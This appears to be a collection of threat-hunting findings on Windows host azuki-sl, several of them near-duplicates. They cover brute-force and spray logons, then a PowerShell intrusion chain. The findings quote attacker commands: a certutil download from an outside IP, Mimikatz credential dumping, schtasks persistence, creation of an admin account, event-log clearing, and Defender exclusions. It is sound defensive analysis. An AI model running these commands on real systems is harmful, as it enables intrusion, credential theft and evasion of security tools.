title: Repeated failed administrator logons from single external IP (115.247.157.74) — likely brute-force
description: Between 2025-11-19 18:45 and 19:16 UTC there are numerous failed Logon attempts for account 'administrator' on device azuki-sl originating from 115.247.157.74. The attempts are high-frequency and sustained (~20+ failures in ~30 minutes), consistent with an automated brute-force or credential-guessing campaign targeting a high-privilege account.

mitre.description: Attempt to gain access by repeatedly guessing passwords for accounts (brute-force).

notes: High-volume failed attempts from a single external IP against a privileged account strongly indicates automated brute-force. Recommend blocking the IP and checking for account lockouts and authentication policy gaps (e.g., missing MFA).

title: High-volume multi-account failed logons from multiple external IPs — credential stuffing / password spraying
description: At ~2025-11-19 21:37–21:39 UTC there is a dense burst of LogonFailed events for a large set of usernames (administrator, guest and many other account names) originating from multiple distinct external IPs (185.156.73.173, 92.63.197.9, 185.156.73.169, 185.156.73.24, 92.63.197.69, etc.). The pattern (many usernames across multiple source IPs in a short window) matches credential stuffing or password spraying aimed at finding valid credentials across many accounts.

mitre.description: Attempts to gain account access by trying commonly used passwords across many accounts (password spraying) or using breached credential lists across accounts (credential stuffing).

indicators_of_compromise: many targeted account names (administrator, admin, guest, user, etc.)
notes: Multiple source IPs and many account names in a short interval are classic for distributed credential stuffing or spray. Prioritize blocking listed IPs, enforce/verify MFA for affected accounts, and search other systems for the same source IPs and any successful logons immediately after this burst.

title: Unusual/remote success and multiple-source logons for user 'kenji.sato' — requires investigation
description: User 'kenji.sato' shows multiple LogonSuccess events on azuki-sl from different source IPs and device names within a short period on 2025-11-19 → 11-20: successes from public IPs and internal addresses (88.97.178.12 with 'sanc-main', 10.0.8.9 / 10.0.8.8 with VM names). Multiple distinct source endpoints authenticating as the same user in short succession increases risk of credential compromise or legitimate remote admin activity from varying jump hosts. There is also a failed attempt for kenji.sato at 2025-11-19 21:39:06 from 88.97.178.12 during the broader spray activity window.

mitre.description: Use of valid credentials (local accounts) to gain access to systems. Multiple successful authentications from different source hosts can indicate credential reuse or lateral movement.

notes: This may be legitimate admin activity (multiple remote management hosts). Investigate 'kenji.sato' for: recent password changes, MFA enrollment and recent MFA prompts, source host ownership (are 88.97.178.12 and 10.0.8.x known admin jump hosts?), and any post-login activity on azuki-sl (process/network events). If unexpected, force a password reset and require MFA revalidation.

title: Persistent brute-force targeting 'administrator' from single external IP
description: Repeated LogonFailed events for account 'administrator' on device azuki-sl originate from 115.247.157.74 over an extended window (multiple events between 2025-11-19 18:45:15 and 2025-11-19 19:16:30, and again near 21:37–21:39). The pattern is a high-frequency sequence of failed attempts against a high-value account (administrator) from a single external IP, consistent with an automated brute-force attack.

mitre.description: Brute force: automated attempts to guess account passwords by repeatedly trying credentials against a service.

notes: 115.247.157.74 repeatedly targets the same high-privilege account with frequent failures — treat as active brute-force. If 'administrator' is a service account with password rotations, confirm normal remote access patterns before ignoring.

title: Mass password-spray / credential-stuffing style attempts from multiple external IPs (21:37–21:39)
description: A concentrated burst of LogonFailed events across dozens of distinct account names (including admin, guest, sysadmin, ftpuser, postgres, many user names) occurs between 2025-11-19 21:37:41 and 21:39:28. Multiple external source IPs are involved (185.156.73.173, 92.63.197.9, 185.156.73.169, 92.63.197.69, 185.156.73.24, 185.156.73.59, etc.). The volume, diversity of usernames, and short time window are consistent with password-spray or credential-stuffing activity targeting azuki-sl.

mitre.description: Password spraying: attempts to access many accounts using a small set of common passwords to avoid lockouts; or credential stuffing using lists of known username/password pairs.

indicators_of_compromise: dozens of attempted usernames (admin, guest, sysadmin, ftpuser, postgres, etc.)
notes: The attack appears distributed across several source IPs and targets many usernames; consider blocking or rate-limiting the source IPs and enforcing MFA or temporary lockout policies for targeted accounts.

title: Anomalous successful logons for 'kenji.sato' from multiple remote hosts/IPs
description: Account 'kenji.sato' shows multiple LogonSuccess events from different remote endpoints within a short timeframe: successes at 2025-11-19 18:36:18 from 88.97.178.12 (remoteDeviceName: sanc-main), at 18:36:21 (no remote IP in one record), and at 19:21:34/36 from 10.0.8.9 (vm00000b). Shortly after, there are LogonFailed events for the same account from 10.0.8.9 at 19:29. This pattern can indicate either normal roaming/multi-device usage or potential credential reuse/compromise (valid account abuse or lateral movement between VMs).

mitre.description: Use of valid accounts to access remote systems (remote services) and potential misuse of legitimate credentials to move laterally.

notes: Verify whether kenji.sato's logins from these IPs/VMs are part of expected behavior (work-from-home, VPN, scheduled jobs). If not, rotate credentials, enforce MFA on the account, and check source hosts (88.97.178.12 and vm00000b) for compromise.

title: Local/system process logons observed (umfd / dwm) — likely benign but note timing overlap with attack windows
description: Multiple LogonSuccess events for system/service accounts (umfd-0/1/3 and dwm-1/3) on azuki-sl at 19:21:35–36 and 21:37:17–18. These are typical Windows service session entries (User-Mode Font Driver Host, Desktop Window Manager) and show no remote IPs. Their occurrence overlaps the attack timeframe but they appear to be local service activity.

mitre.description: Local system/service logons that are commonly legitimate; included for context because they overlap times of suspicious external authentication activity.

notes: These system account logons look normal. No remote IPs are associated. Monitor for any process spawning or anomalous activity tied to these service sessions that would indicate post-compromise behavior.

title: Repeated brute-force attempts against 'administrator' from single external IP
description: Multiple rapid LogonFailed events for account 'administrator' on device azuki-sl originating from 115.247.157.74 across ~18:45–19:16 UTC (and continuing later). The volume and frequency of failures from a single external IP strongly indicate automated password-guessing attempts targeting the built-in Administrator account.

mitre.description: Password guessing / brute-force attempts against an account.

notes: Attempt cadence and single-target (administrator) profile consistent with automated brute-force tools. Recommend blocking IP at network perimeter and checking for any successful escalations or later authentication successes from that account.

title: High-volume credential spray / credential-stuffing attempt from multiple external IPs (21:37–21:39 UTC)
description: A dense burst of LogonFailed events for a large set of distinct user accounts on azuki-sl between ~2025-11-19 21:37:41 and 21:39:28 UTC originates from several external IPs (185.156.73.173, 92.63.197.9, 185.156.73.169, 92.63.197.69, 185.156.73.24, 185.156.73.59 and others). The pattern — many different account names targeted in a short time window from a small set of origin IPs — matches password-spray or credential-stuffing behavior intended to discover valid credentials across many accounts without locking a single account.

mitre.description: Password spraying/credential stuffing across many accounts from external hosts.

indicators_of_compromise: multiple targeted usernames (admin, guest, postgres, ftpuser, sysadmin, etc.)
notes: This is a classic spray pattern — many accounts in a tight window from a small set of source IPs. Immediate action: block/blackhole offending IPs, review for any successful logons in the same window or shortly after, review account lockouts, and check perimeter logs for related attempts.

title: Possible compromised/abused valid account 'kenji.sato' with external-origin successful logon
description: Account 'kenji.sato' shows successful LogonSuccess entries on azuki-sl from an external/public IP (88.97.178.12) at 2025-11-19 18:36:18, as well as later successful logons from internal IP 10.0.8.9 at 19:21:34–19:21:36 and subsequent failed attempts from the external IP at 21:39:06. The external-origin success followed by later failures from the same external IP suggests either a legitimate remote user connecting from an external location or a potentially compromised account being used from an external host. The cross-host remote device names (sanc-main, vm00000b) indicate possible lateral access or remote sessions.

mitre.description: Use of valid credentials (T1078) and potential remote services/remote sessions for lateral movement (T1021).

notes: Verify whether 88.97.178.12 is a known/approved remote location for this user. Correlate with AAD SigninLogs and conditional access/MFA success. If anomalous, force password reset, require MFA re-enrollment, and inspect endpoints sanc-main and vm00000b for post-auth activity (process/network events).

title: High-volume brute-force attempts targeting 'administrator' from single external IP
description: Numerous repeated LogonFailed events for account 'administrator' on device azuki-sl from remote IP 115.247.157.74 over ~45 minutes (multiple attempts between 2025-11-19T18:51:26Z and 2025-11-19T19:16:30Z, and additional attempts later). The pattern (many failures from one IP against the built-in Administrator account) is consistent with targeted password-guessing brute-force activity.

mitre.description: Adversaries may attempt many password guesses against an account to gain access.

notes: Volume and persistence from a single external IP against the built-in Administrator account indicate automated guessing. Recommend immediate blocking of the IP at perimeter and verifying no successful elevation/use occurred.

title: Large-scale credential spray / multi-user brute-force against azuki-sl from multiple external IPs (21:37–21:39)
description: At 2025-11-19T21:37:51Z–21:39:30Z there is a dense burst of LogonFailed events for dozens of different account names (including 'admin', 'guest', 'administrator', 'postgres', 'sysadmin', many others) originating from multiple distinct external IPs (185.156.73.173, 92.63.197.9, 185.156.73.169, 185.156.73.24, 92.63.197.69, 185.156.73.59). This pattern is characteristic of credential spraying or widespread credential-stuffing attempts across many usernames in a short window.

mitre.description: Adversaries attempt a small set of common passwords against many accounts to avoid account lockouts.

indicators_of_compromise: many username hits (e.g., admin, administrator, guest, postgres, sysadmin, teste1, ftpuser)
notes: The burst targets many account names across multiple IPs — likely credential spraying from a botnet or distributed actor. Confirm account lockout policies and consider temporary blocking or rate-limiting these source IPs; enable multifactor authentication if not already enforced for sensitive accounts.

title: Successful and failed logons for 'kenji.sato' from multiple source IPs/devices — possible lateral movement or account compromise
description: The user kenji.sato has multiple successful LogonSuccess events on azuki-sl from different source contexts: 2025-11-19T18:36:18Z shows success from 88.97.178.12 with RemoteDeviceName 'sanc-main'; 2025-11-19T19:21:34Z and 19:21:36Z show successes and attempts from 10.0.8.9 with RemoteDeviceName 'vm00000b'; later at 21:39:06Z there is a LogonFailed from 88.97.178.12 (sanc-main). Multiple distinct remote IPs and hostnames associated with successful logons followed by failures can indicate either legitimate travel/multi-location access or an account being used from multiple hosts — possible lateral movement using valid credentials or account compromise.

mitre.sub_technique: T1021.001 (Remote Desktop Protocol) — possible if these are RDP sessions
mitre.description: Adversaries may use valid credentials to move laterally or use remote services (e.g., RDP) to access systems.

notes: Multiple successful logons from different remote hosts can be legitimate (user remote access) but also consistent with lateral movement using valid credentials. Verify whether kenji.sato should be accessing azuki-sl from sanc-main and vm00000b and review endpoint telemetry (process creation, network connections) on those source hosts for suspicious post-auth activity.

title: Repeated failed logons against 'administrator' from single external IP (likely brute-force)
description: A high-frequency series of LogonFailed events for account 'administrator' targeting device azuki-sl from IP 115.247.157.74 between 2025-11-19T18:45:15Z and 2025-11-19T19:16:30Z. The pattern is consistent with an automated password-guessing attack against a high-privilege account. No successful logon for 'administrator' from this IP is present in the provided window.

mitre.description: Attempting to gain access to accounts using repeated password guesses against a single account from an external IP.

notes: Pattern indicates automated brute-force against the built-in administrator account. Recommend immediate blocking of IP 115.247.157.74 at perimeter and review account lockout events and any recent successful administrative actions on azuki-sl.

title: Large-scale authentication spray across many accounts from multiple external IPs (password spraying/credential stuffing)
description: Between 2025-11-19T21:37:41Z and 2025-11-19T21:39:28Z there is a dense burst of LogonFailed events on azuki-sl for dozens of distinct account names originating from multiple external IP addresses (185.156.73.173, 92.63.197.9, 185.156.73.169, 185.156.73.24, 92.63.197.69, 115.247.157.74, 185.156.73.59). The pattern (many accounts, many IPs, short time window) matches credential spraying/credential stuffing activity aimed at discovering valid credentials across accounts.

mitre.description: Attempting access with common passwords or credential lists across many accounts from distributed IPs to avoid lockouts and find valid credentials.

indicators_of_compromise: numerous target accounts (e.g., administrator, admin, guest, postgres, sysadmin, ftpuser, etc.)
notes: This is a classic password-spray/credential-stuffing pattern. Recommend blocking offending IPs, enforcing/confirming account lockout policies, MFA enforcement, and searching for any successful logons correlated with this spike.

title: Multiple successful logons for 'kenji.sato' from different remote IPs and devices within short interval (possible credential reuse / lateral movement)
description: User 'kenji.sato' has LogonSuccess entries on azuki-sl from at least two distinct remote IPs/devices within the timeframe: 88.97.178.12 (remote device 'sanc-main') at 2025-11-19T18:36:18Z and 10.0.8.9 (remoteDeviceName vm00000b) at 2025-11-19T19:21:34Z. A later LogonFailed for kenji.sato from 88.97.178.12 at 2025-11-19T21:39:06Z is also present. Multiple successful authentications from different network locations and hosts in a short span can indicate credential reuse, concurrent sessions, or lateral movement from a compromised host.

mitre.description: Use of valid credentials to authenticate to systems; multiple sessions from different source hosts may indicate compromised account or legitimate roaming access that should be validated.

notes: Recommend validating whether both remote endpoints (88.97.178.12/sanc-main and 10.0.8.9/vm00000b) are legitimate corporate assets and whether kenji.sato legitimately accessed both. If either host is untrusted, treat as potential account compromise and investigate session activity, host process/connection artifacts and recent lateral movement indicators.

title: Frequent interactive/system account local logons (umfd/dwm) observed — likely benign but note for context
description: Multiple LogonSuccess events for system/service accounts (umfd-0/1/3, dwm-1/3) on azuki-sl appear in logs (e.g., 2025-11-19T19:21:35Z and 2025-11-19T21:37:17Z). These are typically expected local service sessions (user-mode font driver, Desktop Window Manager) and have no remote IP recorded. No direct malicious indicators observed for these entries in the provided window.

mitre.description: Normal system/service account activity can create local logon sessions; included for analyst correlation.

notes: No evidence in these logs of malicious activity for these accounts; included to avoid false positives when correlating other events. If combined with abnormal parent processes or network connections, revisit.

title: PowerShell-delivered reconnaissance and credential harvesting (wupdate.* -> certutil / mm.exe / curl)
description: A user-local PowerShell script (wupdate.bat / wupdate.ps1) was fetched from 78.141.196.6:8080 and executed. The same PowerShell context executed discovery commands (ipconfig, arp, systeminfo, whoami, findstr), used certutil to download binaries to C:\ProgramData\WindowsCache (svchost.exe, mm.exe), executed mm.exe with Mimikatz commands (privilege::debug sekurlsa::logonpasswords), and uploaded data via curl to a Discord webhook. This sequence is classic reconnaissance + credential access followed by exfiltration.

mitre.sub_technique: T1059.001 (PowerShell), (T1003.001 Mimikatz-if applicable), (T1053 Scheduled Task used later for persistence)
mitre.description: PowerShell (T1059.001) used to run system discovery (T1082, T1016), download and run credential-dumping binary (Mimikatz -> T1003), and exfiltrate via web request (T1041).

notes: Sequence begins with a user-initiated WindowsUpdate.bat / wupdate.ps1 downloaded from 78.141.196.6. Multiple discovery commands, certificate utility downloads, and explicit Mimikatz usage (mm.exe) plus exfiltration to a Discord webhook strongly indicate compromise and data theft. Investigate memory, LSA secrets, and network uploads; collect full PowerShell script and related dropped binaries for analysis.

title: Account manipulation and persistence (net.exe + schtasks)
description: Local account 'support' was created and added to the Administrators group, and a scheduled task was created to run a downloaded binary (C:\ProgramData\WindowsCache\svchost.exe) daily as SYSTEM. These actions follow discovery and credential dumping, consistent with persistence and lateral/privilege escalation activity.

mitre.description: Creation of scheduled tasks (T1053) for persistence; account creation / group modification (T1098 / account manipulation); use of legitimate credential mechanisms (cmdkey) and added admin account enabling persistence and lateral movement.

log_lines: 2025-11-19 19:07:46.979651+00:00,kenji.sato,ProcessCreated,azuki-sl,"""powershell.exe"" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1","""schtasks.exe"" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f"
indicators_of_compromise: Commands: schtasks.exe /create, net.exe user /add, net.exe localgroup Administrators /add
notes: If the 'support' account is present, validate last logon, membership, and remove/disable account and task if confirmed malicious. Check domain controllers for corresponding activity and credential reuse.

title: Extensive use of LOLBins and system utilities for discovery and lateral movement
description: Multiple legitimate Windows utilities (certutil, net.exe, cmdkey.exe, schtasks.exe, arp/ipconfig/systeminfo/findstr, wevtutil) were used in ways consistent with adversary reconnaissance, credential harvesting and cleanup (clearing event logs). While these utilities are legitimate, their sequencing and accompanying downloads/exfiltration indicate abuse.

mitre.description: Use of scripting (PowerShell) and LOLBins (certutil, net, cmdkey, schtasks, wevtutil) to perform discovery, download payloads, adjust accounts, and clear event logs (defense evasion).

log_lines: 2025-11-19 19:07:46.979651+00:00,kenji.sato,ProcessCreated,azuki-sl,"""powershell.exe"" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1","""schtasks.exe"" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f"
indicators_of_compromise: certutil.exe used to download remote payloads
wevtutil.exe clearing event logs (wevtutil.exe cl Security / System / Application)
notes: Some MsSense / Defender-related PowerShell entries appear in the logs; however the user-initiated PowerShell download/execution chain and subsequent use of these utilities indicate misuse rather than benign operations. Correlate with EDR alerts and memory captures to confirm credential harvesting.

title: Interactive host compromise: PowerShell download -> payload, credential dump, persistence, and data exfiltration
description: User kenji.sato executed a PowerShell-based downloader that fetched payloads from 78.141.196.6:8080, saved binaries to C:\ProgramData\WindowsCache, created a scheduled task to persist a dropped svchost.exe, executed credential dumping (mm.exe with mimikatz commands), added a local user and elevated it to Administrators, and uploaded data to a Discord webhook. These are post-exploitation actions beyond normal admin maintenance and indicate an active compromise.

mitre.tactic: Execution / Persistence / Credential Access / Exfiltration / Defense Evasion
mitre.sub_technique: PowerShell (T1059.001), Ingress Tool Transfer (T1105), Scheduled Task (T1053.005), Credential Dumping: LSASS Memory (T1003.001), Exfiltration Over Web Service (T1567.002), Clear Windows Event Logs (T1070.001)
mitre.description: PowerShell used to download and execute payloads; files transferred from remote host; scheduled task creation for persistence; mimikatz used to dump credentials; data exfiltration to a Discord webhook; event logs cleared.

log_lines: 2025-11-19 19:07:46.979651+00:00,kenji.sato,ProcessCreated,azuki-sl,"""powershell.exe"" -ExecutionPolicy Bypass -File C:\Users\kenji.sato\AppData\Local\Temp\wupdate.ps1","""schtasks.exe"" /create /tn "Windows Update Check" /tr C:\ProgramData\WindowsCache\svchost.exe /sc daily /st 02:00 /ru SYSTEM /f
indicators_of_compromise: Scheduled task: Windows Update Check -> C:\ProgramData\WindowsCache\svchost.exe
Commands: certutil.exe -urlcache -f http://78.141.196.6:8080/..., schtasks.exe /create ... , wevtutil.exe cl Security/System/Application
notes: PowerShell download+certutil transfer + mimikatz + scheduled task + discord upload indicate interactive attacker. Immediate containment and forensic imaging recommended.

title: Confirmed reconnaissance activity executed by user 'kenji.sato' (network & system discovery)
description: Multiple discovery commands were executed from a PowerShell script run by kenji.sato during the session (ipconfig /all, arp -a, whoami, hostname.exe, systeminfo, findstr OS Name/Version, cmdkey /list). These are standard discovery techniques used to enumerate network and system information and to locate credentials or RDP hosts.

mitre.sub_technique: System Network Configuration Discovery (T1016), System Information Discovery (T1082)
mitre.description: Use of built-in utilities (ipconfig, arp, whoami, systeminfo, hostname, findstr, cmdkey) to enumerate network interfaces, routing, host identity and stored credentials.

indicators_of_compromise: Commands: ipconfig.exe /all, ARP.EXE -a, whoami.exe, hostname.exe, systeminfo.exe, findstr.exe, cmdkey.exe /list
notes: Discovery activity is embedded in downloader script — correlation with subsequent certutil downloads, schtasks, and mm.exe indicates discovery was used to enable follow-on actions.

title: Multiple 'net.exe accounts' and auditpol queries executed from system PowerShell collections
description: Numerous net.exe accounts and auditpol queries were executed via a system-scoped PowerShell (Microsoft Defender ATP DataCollection scripts). These repeated account enumerations and auditpol queries indicate broad account discovery and auditing enumeration, likely as part of an automated reconnaissance or post-compromise script.

mitre.technique: T1087.001, T1069 (Account Discovery), T1070.006 (Clear Windows Event Logs may be related elsewhere)
mitre.description: Frequent invocation of net.exe to list accounts and auditpol to enumerate auditing settings, indicating enumeration of accounts and audit policy.

notes: Some of these PowerShell executions are coming from Defender/collection scripts (paths under DataCollection). However, repeated net.exe account enumerations and auditpol queries merit investigation to confirm benign telemetry vs attacker-driven discovery.

title: No encryption artifacts detected in timeframe
description: Searched DeviceFileEvents on device as-pc2 for 2026-01-27 → 2026-01-28 for signs of ransomware/encryption (mass file renames, known ransomware extensions like .locked/.crypt/.enc/.vault, sudden widespread user-file modification). No file creations/renames matching common ransomware extension patterns or mass modifications of user documents were observed in the provided logs.

mitre.description: Data Encrypted for Impact — encrypting files to disrupt availability. No evidence found in provided DeviceFileEvents for this device/timeframe.

log_lines: No DeviceFileEvents matched typical ransomware/encryption indicators (.locked, .crypt, .enc, .cry, mass rename patterns) in the provided 2026-01-27 → +1 day log set for device as-pc2
notes: Absence of encryption artifacts in these file events. Continue to review process/network events for execution or C2 if further evidence appears.

title: Batch script file created in user profile and ProgramData (potential staging of malicious script)
description: A .bat file was created in the user's profile and later a kill.bat was created in C:\ProgramData. The same SHA256 appears in the user-located copy (ProgramDatakill.bat). Staging of a batch in ProgramData is suspicious because ProgramData is commonly used for persistence or to hide utilities accessible to all users. No direct execution events in the supplied file events — further process evidence required.

mitre.description: Command and scripting interpreter — batch files may be used to execute malicious actions; placement in ProgramData can be used for persistence/ evasion.

notes: Collect both .bat files for static analysis (AV/VT), check process creation logs for cmd.exe/powershell.exe execution around or after file creation times, and review scheduled tasks/services/startup entries that may reference these files.

title: Multiple unknown/random-named DLLs written to C:\Windows\SystemTemp\<random> directories
description: Several DLL files with randomized-looking names were created under C:\Windows\SystemTemp\<random>\<same>.dll. Such behavior can be benign (installers, unpackers) but is also consistent with droppers/stagers that unpack payloads into temporary directories. The creations occurred under 'system' account which can indicate an installer or a process running elevated; parent process data is not available in these file events and should be retrieved.

mitre.description: Obfuscated files or information and process injection/dynamic library abuse — dropping DLLs to temp locations can be used for side-loading or later injection/execution.

notes: Retrieve DeviceProcessEvents for the creation timestamps to identify the parent process that wrote these DLLs. If any of these DLLs are subsequently loaded by a signed or trusted binary, escalate for possible side-loading.

title: Executable created/modified in ProgramData (wsync.exe) with multiple different hashes
description: An executable named wsync.exe was created under C:\ProgramData and subsequently modified; multiple different SHA256 values are observed across writes. Frequent overwrites with different hashes in ProgramData (and by a user account) can indicate a dropped/updating malicious binary or benign updater activity — requires validation (digital signature, parent process).

mitre.description: Create or modify system-service or persistent components; binaries written to shared locations can be used for persistence or scheduled tasks. Investigate for execution and persistence mechanisms.

notes: Pull the binary (or remote file) for static/dynamic analysis, check Digital Signature, search VT by the hashes, query process creation and autoruns (services, scheduled tasks, Run keys) for references to wsync.exe, and check network connections from device for unusual C2.

title: User downloaded/installed Advanced IP Scanner / 'scan.exe' observed
description: A file scan.exe was created in the user's Downloads folder and installer artifacts for Advanced IP Scanner were observed in a Temp folder (advanced_ip_scanner.exe and many extracted DLLs). This is likely a user-initiated tool installation, but remote scanning tools can be misused by attackers. Confirm whether the download was legitimate and intended.

mitre.description: Network discovery tools can be used for reconnaissance; installer artifacts in temp directories are consistent with legitimate installer unpacking, but should be validated.

notes: If the user legitimately installed Advanced IP Scanner, mark as benign after confirmation. If unexpected, investigate for local scanning attempts and inspect process/network activity generated by the tool.

title: Windows Defender exclusions added for Temp path, ProgramData cache and broad file extensions (possible defense evasion)
description: Registry values under HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions were created setting folder, extension and process exclusions on device azuki-sl within the requested time window. Entries include a user Temp path (C:\Users\KENJI~1.SAT\AppData\Local\Temp), C:\ProgramData\WindowsCache, broad extensions (.bat, .ps1, .exe) and process exclusions (mm.exe, svchost.exe). All changes were initiated by the system account with msmpeng.exe as the initiating process. Excluding Temp and adding broad executable/script extensions is a common defensive-evasion technique used to permit malware persistence and execution without detection. Although msmpeng.exe is a legitimate Defender component, the combination of broad extension exclusions, process exclusions and Temp-path exclusion is anomalous and warrants investigation (could be misconfiguration, policy push, or malicious tampering).

mitre.sub_technique: T1562.001 (Disable or Modify Security Tools) ; T1112 (Modify Registry)
mitre.description: Modifying Defender exclusion registry keys to allow files/processes to run without scanning (impair defenses) and creating persistent allowances via registry.

notes: msmpeng.exe is the Windows Defender service binary — this activity could be from a legitimate Defender update or management policy. However: (1) excluding Temp and broad executable/script extensions and processes is uncommon and high-risk; (2) confirm whether these exclusions were pushed via central management (Intune/GPO) or were local actions. Check for dropped files, scheduled tasks, or services that leverage the excluded paths/process names and validate endpoint agent integrity.

title: Defender install location modified to temporary folder (suspicious context supporting Exclusions changes)
description: A registry value NewLocation under HKLM\SOFTWARE\Microsoft\Windows Defender was set to a temporary path (C:\Windows\TEMP\1534B520-B5D6-47AF-924C-36876A1C6640) shortly before mass Defender registry activity and exclusions. Relocating Defender components to a temp folder or temporary install location can indicate abuse of the security service or an installer running from temp. The change occurred prior to many Defender registry writes; although Defender updates may use temporary extraction paths, this sequence combined with the exclusions above increases suspicion.

mitre.description: Modifying Defender-related registry values (installation location) and registry keys to alter security tooling behavior.

notes: Temporary extraction during Defender update/installation can explain a NewLocation in TEMP; confirm via update logs and management control plane whether these were expected. Correlate with process/file events in C:\Windows\TEMP and C:\ProgramData\Microsoft\Windows Defender\platform for unexpected executables or timestamps.
